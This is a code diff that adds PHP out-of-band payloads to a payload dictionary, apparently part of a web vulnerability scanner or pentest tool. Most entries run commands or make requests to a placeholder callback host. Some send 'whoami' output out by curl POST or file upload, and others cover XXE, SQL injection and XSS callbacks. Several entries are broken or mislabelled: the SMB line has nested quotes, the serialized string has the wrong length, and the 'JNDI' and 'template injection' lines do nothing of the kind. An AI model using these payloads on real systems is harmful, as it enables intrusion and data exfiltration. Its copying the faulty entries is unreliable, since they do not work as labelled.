@@ -224,6 +224,63 @@ PATH_TRAVERSAL_PAYLOADS = {
 
 # --- Out-of-Band (OOB) Payloads ---
 OOB_PAYLOADS = {
+    "php": [
+        # DNS
+        "<?php system('nslookup INTERACTSH_URL'); ?>",
+        "<?php exec('dig INTERACTSH_URL'); ?>",
+        "<?php shell_exec('host INTERACTSH_URL'); ?>",
+        
+        # HTTP/HTTPS
+        "<?php file_get_contents('http://INTERACTSH_URL/whoami'); ?>",
+        "<?php curl_exec(curl_init('http://INTERACTSH_URL/whoami')); ?>",
+        "<?php system('curl http://INTERACTSH_URL/whoami'); ?>",
+        "<?php exec('wget -qO- http://INTERACTSH_URL/whoami'); ?>",
+        "<?php shell_exec('curl -s http://INTERACTSH_URL/whoami'); ?>",
+        "<?php `curl http://INTERACTSH_URL/whoami`; ?>",
+        
+        # POST data
+        "<?php $ch=curl_init(); curl_setopt($ch,CURLOPT_URL,'http://INTERACTSH_URL'); curl_setopt($ch,CURLOPT_POST,1); curl_setopt($ch,CURLOPT_POSTFIELDS,'data='.shell_exec('whoami')); curl_exec($ch); ?>",
+        
+        # File upload
+        "<?php $ch=curl_init(); $fp=fopen('php://temp','w+'); fwrite($fp,shell_exec('whoami')); rewind($fp); curl_setopt($ch,CURLOPT_URL,'http://INTERACTSH_URL'); curl_setopt($ch,CURLOPT_INFILE,$fp); curl_setopt($ch,CURLOPT_INFILESIZE,filesize('php://temp')); curl_exec($ch); ?>",
+        
+        # SMB
+        "<?php system('smbclient -c 'whoami' //INTERACTSH_URL/share'); ?>",
+        
+        # LDAP
+        "<?php ldap_connect('ldap://INTERACTSH_URL:389'); ?>",
+        
+        # JNDI
+        "<?php $jndi = 'ldap://INTERACTSH_URL:1389/Basic/Command/whoami'; ?>",
+        
+        # XXE
+        "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY % remote SYSTEM 'http://INTERACTSH_URL/whoami'>%remote;]>",
+        
+        # SSRF
+        "<?php file_get_contents('http://INTERACTSH_URL/whoami'); ?>",
+        
+        # Deserialization
+        "<?php unserialize('O:8:\"stdClass\":1:{s:4:\"data\";s:10:\"whoami\";}'); ?>",
+        
+        # Template injection
+        "<?php echo '{{7*7}}'; ?>",
+        
+        # Log injection
+        "<?php error_log('whoami', 0); ?>",
+        
+        # Command injection
+        "<?php system('whoami'); ?>",
+        "<?php exec('whoami'); ?>",
+        "<?php shell_exec('whoami'); ?>",
+        "<?php passthru('whoami'); ?>",
+        "<?php `whoami`; ?>",
+        
+        # SQL injection
+        "<?php mysql_query('SELECT LOAD_FILE(CONCAT(\"\\\\\",INTERACTSH_URL,\"\\\\\",whoami))'); ?>",
+        
+        # XSS
+        "<?php echo '<script>fetch(\"http://INTERACTSH_URL/whoami\")</script>'; ?>"
+    ],
     "dns": [
         "nslookup `whoami`.INTERACTSH_URL",
         "dig `whoami`.INTERACTSH_URL",
